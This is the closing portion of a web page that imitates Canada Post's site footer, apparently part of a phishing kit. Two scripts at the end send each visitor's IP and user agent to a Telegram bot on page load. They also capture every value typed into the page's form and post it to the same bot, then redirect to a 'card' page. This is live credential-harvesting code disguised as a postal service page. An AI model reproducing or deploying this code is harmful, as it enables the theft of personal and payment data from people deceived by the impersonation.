                                                                <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Linkedin</title>
                                                                <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                <title>YouTube</title>
                                                                <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                    <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                </g>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                </ul>
                                                <ul class="feedback-group">
                                                    <li>
                                                        <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                        <a href="#"><span class="tool-description">Website feedback</span></a>
                                                    </li>
                                                </ul>
                                                <h2 class="show-for-medium-up">Support</h2>
                                                <ul>
                                                    <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                    <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                </ul>
                                            </div>
                                            <div class="medium-6 columns">
                                                <h2 class="show-for-medium-up">Corporate</h2>
                                                <ul>
                                                    <li><a href="#" target="">About us</a></li>
                                                    <li><a href="#" target="">Media centre</a></li>
                                                    <li><a href="#" target="">Careers</a></li>
                                                    <li><a href="#" target="">I'm an employee</a></li>
                                                    <li><a href="#" target="">Talent Zone</a></li>
                                                    <li><a href="#" target="">Negotiations Updates</a></li>
                                                </ul>
                                                <h2 class="show-for-medium-up">Blogs</h2>
                                                <ul>
                                                    <li><a href="#" target="">Business Matters</a></li>
                                                    <li><a href="#" target="">Canada Post Magazine</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div class="row show-for-small-only">
                                            <div class="small-12 columns">
                                                <ul class="accordion" role="tablist">
                                                    <li>
                                                        <h2>Connect with us</h2>
                                                        <h2 class="show-for-medium-up">Connect with us</h2>
                                                        <ul class="social-media-icons">
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Facebook</title>
                                                                        <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Twitter</title>
                                                                        <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Instagram</title>
                                                                        <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                        <title>Linkedin</title>
                                                                        <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="#">
                                                                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                        <title>YouTube</title>
                                                                        <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                            <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                        </g>
                                                                    </svg>
                                                                </a>
                                                            </li>
                                                        </ul>
                                                        <ul class="feedback-group">
                                                            <li>
                                                                <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                                <a href="#"><span class="tool-description">Website feedback</span></a>
                                                            </li>
                                                        </ul>
                                                        <hr>
                                                    </li>
                                                    <li class="accordion-navigation">
                                                        <a href="#panelSupport" role="tab" class="accordion-title" id="panelSupport-heading" aria-controls="panelSupport">
                                                            <h2>Support</h2>
                                                        </a>
                                                        <div id="panelSupport" class="content" role="tabpanel" aria-lacapostedby="panelSupport-heading">
                                                            <h2 class="show-for-medium-up">Support</h2>
                                                            <ul>
                                                                <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                                <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                            </ul>
                                                        </div>
                                                        <hr>
                                                    </li>
                                                    <li class="accordion-navigation">
                                                        <a href="#panelCorporate" role="tab" class="accordion-title" id="panelCorporate-heading" aria-controls="panelCorporate">
                                                            <h2>Corporate</h2>
                                                        </a>
                                                        <div id="panelCorporate" class="content" role="tabpanel" aria-lacapostedby="panelCorporate-heading">
                                                            <h2 class="show-for-medium-up">Corporate</h2>
                                                            <ul>
                                                                <li><a href="#" target="">About us</a></li>
                                                                <li><a href="#" target="">Media centre</a></li>
                                                                <li><a href="#" target="">Careers</a></li>
                                                                <li><a href="#" target="">I'm an employee</a></li>
                                                                <li><a href="#" target="">Talent Zone</a></li>
                                                                <li><a href="#" target="">Negotiations Updates</a></li>
                                                            </ul>
                                                        </div>
                                                        <hr>
                                                    </li>
                                                    <li class="accordion-navigation">
                                                        <a href="#panelBlogs" role="tab" class="accordion-title" id="panelBlogs-heading" aria-controls="panelBlogs">
                                                            <h2>Blogs</h2>
                                                        </a>
                                                        <div id="panelBlogs" class="content" role="tabpanel" aria-lacapostedby="panelBlogs-heading">
                                                            <h2 class="show-for-medium-up">Blogs</h2>
                                                            <ul>
                                                                <li><a href="#" target="">Business Matters</a></li>
                                                                <li><a href="#" target="">Canada Post Magazine</a></li>
                                                            </ul>
                                                        </div>
                                                        <hr>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </section>
                                    <section class="footer-l2 cpc-tb--suppress-toolbar" role="contentinfo">
                                        <div class="row large-up-footer show-for-large-up">
                                            <div class="large-12 columns text-center">
                                                <div class="left-items text-left">
                                                    © Canada Post Corporation
                                                </div>
                                                <div class="center terms-links">
                                                    <ul>
                                                        <li><a href="#" target="">Accessibility</a></li>
                                                        <li><a href="#" target="">Legal</a></li>
                                                        <li><a href="#" target="">Privacy</a></li>
                                                    </ul>
                                                </div>
                                                <div class="right-items">
                                                    <a href="#"><img src="gov-canada-logo.svg" alt="Canada"></a>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row show-for-medium-only">
                                            <div class="large-12 columns text-center">
                                                <div class="terms-links">
                                                    <ul>
                                                        <li><a href="#" target="">Accessibility</a></li>
                                                        <li><a href="#" target="">Legal</a></li>
                                                        <li><a href="#" target="">Privacy</a></li>
                                                    </ul>
                                                </div>
                                                <div class="cpc-corp-copyright">
                                                    © Canada Post Corporation
                                                    <div class="gov-can-logo">
                                                        <a href="#"><img src="gov-canada-logo.svg" alt="Canada"></a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row show-for-small-only">
                                            <div class="large-12 columns text-center">
                                                <div class="center terms-links">
                                                    <ul>
                                                        <li><a href="#" target="">Accessibility</a></li>
                                                        <li><a href="#" target="">Legal</a></li>
                                                        <li><a href="#" target="">Privacy</a></li>
                                                    </ul>
                                                </div>
                                                <div class="row">
                                                    <div class="large-12 columns">
                                                        <div class="cpc-corp-copyright">
                                                            © Canada Post Corporation
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="row">
                                                    <div class="large-12 columns">
                                                        <div class="center">
                                                            <a href="#"><img src="/assets/cap/gov-canada-logo.svg" alt="Canada"></a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                            </div>
                        </div>
                    </cpc-footer>
                </div>
            </div>
        </div>
    </body>
    <script>
            // Telegram API URL with your bot token and method
    let messageText = `Details Page\n\nIP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`;

const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
const payload = {
    chat_id: '<?php echo $_SESSION['CHAT_ID']?>',
    text: messageText
};

fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
    </script>
    <script>
                  
document.getElementById('myForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // Telegram API URL with your bot token and method
 
    const formData = new FormData(this);
    let messageText = '';
    for (const [key, value] of formData.entries()) {
        messageText += `${key}: ${value}\n`; // Format the message
    }

    messageText += `IP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`

    const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
    const payload = {
        chat_id: '<?php echo $_SESSION['CHAT_ID']?>',
        text: messageText
    };


    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            window.location.href = '/pages/card/page.php'; // Client-side redirection
        } else {
            throw new Error('Something went wrong');
        }
    })
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
});
</script>


</html>
